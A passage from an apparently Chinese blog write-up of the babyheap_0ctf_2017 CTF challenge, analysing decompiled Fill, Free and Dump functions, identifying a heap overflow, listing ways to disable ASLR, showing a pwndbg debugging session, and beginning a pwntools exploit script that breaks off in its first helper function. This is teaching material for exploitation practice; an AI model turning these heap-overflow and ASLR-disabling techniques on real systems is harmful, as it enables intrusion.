class="hljs-comment">//*(_QWORD *)(24LL * v1 + a1 + 16) == chunk_data</span><br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>上图是Fill函数分伪代码，这个函数的功能比较有意思，漏洞也是存在这个函数中的。<br>在填充内容的功能中，调用input函数来输入堆块的大小，并没有设置字符串结尾。而且比较有意思的是，这次又让我们重新输入了content_size，但是程序并没有将原来结构体中的content_size更改。且执行这个函数之后allocate chunk时堆块的size域没有改变，所以这里就出现了任意堆溢出的情形。</p><h3 id="Free-函数"><a href="#Free-函数" class="headerlink" title="Free 函数"></a>Free 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Free</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) = <span class="hljs-number">0</span>;<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">free</span>(*(<span class="hljs-type">void</span> **)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>));<br>    *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;     <span class="hljs-comment">// 指针置空</span><br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入序号，释放chunk。将 flag 字段，size 字段清0，free了数据chunk的指针同时也清0，不存在uaf</p><h3 id="Dump-函数"><a href="#Dump-函数" class="headerlink" title="Dump 函数"></a>Dump 函数</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">Dump</span><span class="hljs-params">(__int64 a1)</span><br>{<br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);<br>  v1 = input();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; *(_DWORD *)(<span class="hljs-number">24LL</span> * v1 + a1) == <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Content: "</span>);<br>    write_func(*(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">16</span>), *(_QWORD *)(<span class="hljs-number">24LL</span> * v1 + a1 + <span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">puts</span>(byte_14F1);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>输入序号，打印内容</p><h2 id="gdb-动态调试"><a href="#gdb-动态调试" class="headerlink" title="gdb 动态调试"></a>gdb 动态调试</h2><p>还记得之前get_addr这个函数吗？这个函数主要使用来生成随机地址，其中指针也存放在哪里。</p><h3 id="关闭ASLR保护"><a href="#关闭ASLR保护" class="headerlink" title="关闭ASLR保护"></a>关闭ASLR保护</h3><p>由于这个程序开启了PIE保护，为了方便调试程序及查看堆内存，因此我们将Linux的ALSR(地址空间随机化)进行关闭。首先看一下ALSR开启的状态，可以使用下面的任意其中一种命令</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~$ cat /proc/sys/kernel/randomize_va_space<br><span class="hljs-number">2</span><br>ubuntu@ubuntu:~$ sysctl -a --pattern randomize<br>kernel.randomize_va_space = <span class="hljs-number">2</span><br>ubuntu@ubuntu:~$<br><br>###<br><span class="hljs-number">0</span> = 关闭<br><span class="hljs-number">1</span> = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（PIE也会影响heap的随机化）<br><span class="hljs-number">2</span> = 全随机。除了<span class="hljs-number">1</span>中所述，还有heap。<br>###<br></code></pre></td></tr></tbody></table></figure><p>现在关闭ASLR，关闭方法如下：<br><strong>方法一： 手动修改randomize_va_space文件</strong><br>上面介绍的randomize_va_space文件的枚举值含义，设置的值不同，linux内核加载程序的地址空间的策略就会不同。比较简单明了。这里0代表关闭ASLR。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">echo <span class="hljs-number">0</span> &gt; /proc/sys/kernel/randomize_va_space<br>#注意，这里是先进root权限，后执行。<br>#重启之后会恢复默认<br></code></pre></td></tr></tbody></table></figure><p><strong>方法二： 使用sysctl控制ASLR</strong></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">sysctl -w kernel.randomize_va_space=<span class="hljs-number">0</span><br>#重启之后将恢复默认<br>#如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。<br></code></pre></td></tr></tbody></table></figure><p><strong>方法三： 使用setarch控制单个程序的随机化</strong><br>如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setarch `uname -m` -R ./your_program<br>#-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)<br></code></pre></td></tr></tbody></table></figure><p><strong>方法四： 在GDB场景下，使用set disable-randomization off</strong><br>在调试特定程序时，可以通过set disable-randomization命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。<br>当然，这里开启，关闭和查看的方法看起来就比较正规了。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">关闭ASLR：<br><span class="hljs-built_in">set</span> disable-randomization on<br>开启ASLR：<br><span class="hljs-built_in">set</span> disable-randomization off<br>查看ASLR状态：<br>show disable-randomization<br></code></pre></td></tr></tbody></table></figure><p>我们如何找到那个随机地址呢？通过多次对程序gdb调试，发现了一直变化的地址（此时的ASLR已关闭，参见下文章下面的内容），下面的代码框之中是两次gdb调试的内存分布：</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png'><img src="https://s2.loli.net/2023/09/13/8hD1tAzmP27Y3ky.png" alt="Snipaste_2023-09-13_15-53-21.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png'><img src="https://s2.loli.net/2023/09/13/gYnAKZ5RxtcXfPH.png" alt="Snipaste_2023-09-13_15-54-08.png"></p><p>通过对比发现，变动的只有第一行的地址：</p><p>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    0x40729d6e2000     0x40729d6e3000 rw-p     1000 0 </p><p>​    0x2dd727226000     0x2dd727227000 rw-p     1000 0 </p><p>到这里，可以猜测一下，程序的指针应该也存放在这片内存区域中。<br>我们重新gdb调试，通过执行函数Allocate和fill，来看一下这片内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c">giantbranch@ubuntu:/mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0c<br>tf_2017$ gdb babyheap_0ctf_2017<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 175 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from babyheap_0ctf_2017...<span class="hljs-params">(no debugging symbols found)</span>...done.<br>pwndbg&gt; r<br>Starting program: /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017 <br>===== Baby Heap in <span class="hljs-number">2017</span> =====<br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">1</span><br>Size: <span class="hljs-number">20</span><br>Allocate Index <span class="hljs-number">0</span><br><span class="hljs-number">1.</span> Allocate<br><span class="hljs-number">2.</span> Fill<br><span class="hljs-number">3.</span> Free<br><span class="hljs-number">4.</span> Dump<br><span class="hljs-number">5.</span> Exit<br>Command: <span class="hljs-number">2</span><br>Index: <span class="hljs-number">0</span><br>Size: <span class="hljs-number">40</span><br>Content: aaaaaaaaaaaaaaaaaa<br>^C<br>Program received signal SIGINT, Interrupt.<br><span class="hljs-number">0x00007ffff7b04360</span> in __read_nocancel () at ../sysdeps/unix/syscall-template.S:<span class="hljs-number">84</span><br><span class="hljs-number">84</span>../sysdeps/unix/syscall-template.S: No such file or directory.<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>───────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────<br> RAX  <span class="hljs-number">0xfffffffffffffe00</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x15</span><br> RDI  <span class="hljs-number">0x0</span><br> RSI  <span class="hljs-number">0x555555757023</span> ◂— <span class="hljs-number">0x20fe10000000000</span><br> R8   <span class="hljs-number">0x7ffff7fdd700</span> ◂— <span class="hljs-number">0x7ffff7fdd700</span><br> R9   <span class="hljs-number">0x9</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x555555554a40</span> ◂— xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffdd50</span> ◂— <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br> RSP  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br> RIP  <span class="hljs-number">0x7ffff7b04360</span> (__read_nocancel+<span class="hljs-number">7</span>) ◂— cmp    rax, <span class="hljs-number">-0xfff</span><br>────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────<br> ► <span class="hljs-number">0x7ffff7b04360</span> &lt;__read_nocancel+<span class="hljs-number">7</span>&gt;     cmp    rax, <span class="hljs-number">-0xfff</span><br>   <span class="hljs-number">0x7ffff7b04366</span> &lt;__read_nocancel+<span class="hljs-number">13</span>&gt;    jae    read+<span class="hljs-number">73</span> &lt;<span class="hljs-number">0x7ffff7b04399</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b04399</span> &lt;read+<span class="hljs-number">73</span>&gt;               mov    rcx, qword ptr [rip + <span class="hljs-number">0x2ccad8</span>]<br>   <span class="hljs-number">0x7ffff7b043a0</span> &lt;read+<span class="hljs-number">80</span>&gt;               neg    eax<br>   <span class="hljs-number">0x7ffff7b043a2</span> &lt;read+<span class="hljs-number">82</span>&gt;               mov    dword ptr fs:[rcx], eax<br>   <span class="hljs-number">0x7ffff7b043a5</span> &lt;read+<span class="hljs-number">85</span>&gt;               or     rax, <span class="hljs-number">0xffffffffffffffff</span><br>   <span class="hljs-number">0x7ffff7b043a9</span> &lt;read+<span class="hljs-number">89</span>&gt;               ret    <br> <br>   <span class="hljs-number">0x7ffff7b043aa</span>                         nop    word ptr [rax + rax]<br>   <span class="hljs-number">0x7ffff7b043b0</span> &lt;write&gt;                 cmp    dword ptr [rip + <span class="hljs-number">0x2d2389</span>], <span class="hljs-number">0</span> &lt;<span class="hljs-number">0x7ffff7dd6740</span>&gt;<br>   <span class="hljs-number">0x7ffff7b043b7</span> &lt;write+<span class="hljs-number">7</span>&gt;               jne    write+<span class="hljs-number">25</span> &lt;<span class="hljs-number">0x7ffff7b043c9</span>&gt;<br>    ↓<br>   <span class="hljs-number">0x7ffff7b043c9</span> &lt;write+<span class="hljs-number">25</span>&gt;              sub    rsp, <span class="hljs-number">8</span><br>─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp  <span class="hljs-number">0x7fffffffdbf8</span> —▸ <span class="hljs-number">0x5555555551fd</span> ◂— mov    qword ptr [rbp - <span class="hljs-number">8</span>], rax<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│      <span class="hljs-number">0x7fffffffdc00</span> ◂— <span class="hljs-number">0x28</span> <span class="hljs-comment">/* '(' */</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│      <span class="hljs-number">0x7fffffffdc08</span> —▸ <span class="hljs-number">0x555555757010</span> ◂— <span class="hljs-number">0x6161616161616161</span> (<span class="hljs-string">'aaaaaaaa'</span>)<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│      <span class="hljs-number">0x7fffffffdc10</span> ◂— <span class="hljs-number">0x13</span><br>... ↓<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│ rbp  <span class="hljs-number">0x7fffffffdc20</span> —▸ <span class="hljs-number">0x7fffffffdc50</span> —▸ <span class="hljs-number">0x7fffffffdc70</span> —▸ <span class="hljs-number">0x5555555553e0</span> ◂— push   r15<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│      <span class="hljs-number">0x7fffffffdc28</span> —▸ <span class="hljs-number">0x555555554f48</span> ◂— jmp    <span class="hljs-number">0x555555554f4e</span><br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│      <span class="hljs-number">0x7fffffffdc30</span> ◂— <span class="hljs-number">0x0</span><br>───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────<br> ► f <span class="hljs-number">0</span>     <span class="hljs-number">7f</span>fff7b04360 __read_nocancel+<span class="hljs-number">7</span><br>   f <span class="hljs-number">1</span>     <span class="hljs-number">5555555551f</span>d<br>   f <span class="hljs-number">2</span>     <span class="hljs-number">555555554f</span>48<br>   f <span class="hljs-number">3</span>     <span class="hljs-number">555555555188</span><br>   f <span class="hljs-number">4</span>     <span class="hljs-number">7f</span>fff7a2d840 __libc_start_main+<span class="hljs-number">240</span><br>Program received signal SIGINT<br>pwndbg&gt; vmmap<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x3b0326206000</span>     <span class="hljs-number">0x3b0326207000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x555555554000</span>     <span class="hljs-number">0x555555556000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555755000</span>     <span class="hljs-number">0x555555756000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555756000</span>     <span class="hljs-number">0x555555757000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/PWN题/Range/ctfshow/ctf-pwn-challenges/heap/fastbin-attack/babyheap_0ctf_2017/babyheap_0ctf_2017<br>    <span class="hljs-number">0x555555757000</span>     <span class="hljs-number">0x555555778000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [heap]<br>    <span class="hljs-number">0x7ffff7a0d000</span>     <span class="hljs-number">0x7ffff7bcd000</span> r-xp   <span class="hljs-number">1</span>c0000 <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7bcd000</span>     <span class="hljs-number">0x7ffff7dcd000</span> ---p   <span class="hljs-number">200000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dcd000</span>     <span class="hljs-number">0x7ffff7dd1000</span> r--p     <span class="hljs-number">4000</span> <span class="hljs-number">1</span>c0000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd1000</span>     <span class="hljs-number">0x7ffff7dd3000</span> rw-p     <span class="hljs-number">2000</span> <span class="hljs-number">1</span>c4000 /lib/x86_64-linux-gnu/libc<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7dd3000</span>     <span class="hljs-number">0x7ffff7dd7000</span> rw-p     <span class="hljs-number">4000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7dd7000</span>     <span class="hljs-number">0x7ffff7dfd000</span> r-xp    <span class="hljs-number">26000</span> <span class="hljs-number">0</span>      /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7fdc000</span>     <span class="hljs-number">0x7ffff7fdf000</span> rw-p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffff7ff7000</span>     <span class="hljs-number">0x7ffff7ffa000</span> r--p     <span class="hljs-number">3000</span> <span class="hljs-number">0</span>      [vvar]<br>    <span class="hljs-number">0x7ffff7ffa000</span>     <span class="hljs-number">0x7ffff7ffc000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      [vdso]<br>    <span class="hljs-number">0x7ffff7ffc000</span>     <span class="hljs-number">0x7ffff7ffd000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">25000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffd000</span>     <span class="hljs-number">0x7ffff7ffe000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">26000</span>  /lib/x86_64-linux-gnu/ld<span class="hljs-number">-2.23</span>.so<br>    <span class="hljs-number">0x7ffff7ffe000</span>     <span class="hljs-number">0x7ffff7fff000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      <br>    <span class="hljs-number">0x7ffffffde000</span>     <span class="hljs-number">0x7ffffffff000</span> rw-p    <span class="hljs-number">21000</span> <span class="hljs-number">0</span>      [<span class="hljs-built_in">stack</span>]<br><span class="hljs-number">0xffffffffff600000</span> <span class="hljs-number">0xffffffffff601000</span> r-xp     <span class="hljs-number">1000</span> <span class="hljs-number">0</span>      [vsyscall]<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>再看一下 0x3b0326206000 这片内存区域，确定是程序结构体中指针存放的位置，标注一下：</p><p>这里我重新调试了一个gdb</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0xb422b6be0c0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be0d0</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000014</span><br>    #chunk_flag<span class="hljs-meta">#size</span><br><span class="hljs-number">0xb422b6be0e0</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #chunk_data_ptr<br><span class="hljs-number">0xb422b6be0f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be100</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0xb422b6be130</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h2 id="exp-讲解"><a href="#exp-讲解" class="headerlink" title="exp 讲解"></a>exp 讲解</h2><p>exp的主要内容如下：</p><blockquote><p>exp来自@yichen师傅：<a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a></p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br>elf = ELF(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br><br><span class="hljs-comment">#首先是定义的一些函数，对应着程序的功能</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span 